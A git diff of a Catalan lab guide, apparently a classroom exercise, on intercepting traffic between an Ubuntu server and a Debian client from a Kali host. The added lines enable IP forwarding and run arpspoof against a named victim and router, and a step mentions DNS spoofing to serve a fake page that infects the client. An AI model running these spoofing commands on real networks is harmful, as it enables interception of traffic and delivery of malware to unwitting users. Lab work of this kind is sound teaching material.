@@ -244,8 +244,14 @@ iptables -t nat -A POSTROUTING -s 192.168.3.0/24 -o enp0s3 -j MASQUERADE
 
 5. Kali Linux, intercepta la conexió (MITMA), suplanta el reenviament de paquets entre el "servidor Ubuntu" i el client "Debian Minimal".
 
-```
+```bash
 # Host Kali
+
+sysctl -w net.ipv4.ip_forward=1 # Activar ip forward
+
+# arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
+
+arpspoof -i eth0 -t 192.168.3.2 192.168.3.1
 
 
 ```
@@ -254,4 +260,4 @@ iptables -t nat -A POSTROUTING -s 192.168.3.0/24 -o enp0s3 -j MASQUERADE
 
 7. Un cop té accés al DNS, pot implantar una pàgina nova falsa.
 
-8. El client cau en la pàgina falsa i es infectat.
+8. El client cau en la pàgina falsa i es infectat. (AMB __DNSSPOOF__)
